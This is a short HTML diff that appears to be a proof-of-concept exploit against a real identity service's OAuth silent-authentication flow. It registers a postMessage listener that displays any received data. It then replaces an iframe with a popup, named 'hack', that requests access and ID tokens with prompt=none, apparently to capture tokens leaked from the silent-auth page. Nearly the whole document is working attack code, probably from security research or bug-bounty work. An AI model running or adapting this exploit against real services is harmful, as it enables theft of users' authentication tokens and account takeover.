@@ -2,7 +2,7 @@
   <body>
     <script>
       window.addEventListener("message", (event) => {alert(window.origin + "\r\n" + JSON.stringify(event.data))}, false); 
+      w = open("https://identity.kontur.ru/connect/authorize?response_type=token+id_token&client_id=Notifications.Feed.Production.Front.SDK&scope=openid+Notifications.Feed.Production.API.Sockets&redirect_uri=https%3A%2F%2Fidentity.kontur.ru%2Fsilent-auth.html&prompt=none&nonce=syzMSN8zr7omGQYHAyGeKJTPSkUsWnOU", "hack", "'width=800,height=300,top=500'")
     </script>
-    <iframe src="https://identity.kontur.ru/connect/authorize?response_type=token+id_token&client_id=Notifications.Feed.Production.Front.SDK&scope=openid+Notifications.Feed.Production.API.Sockets&redirect_uri=https%3A%2F%2Fidentity.kontur.ru%2Fsilent-auth.html&prompt=none&nonce=syzMSN8zr7omGQYHAyGeKJTPSkUsWnOU"></iframe>
   </body>
 </html>
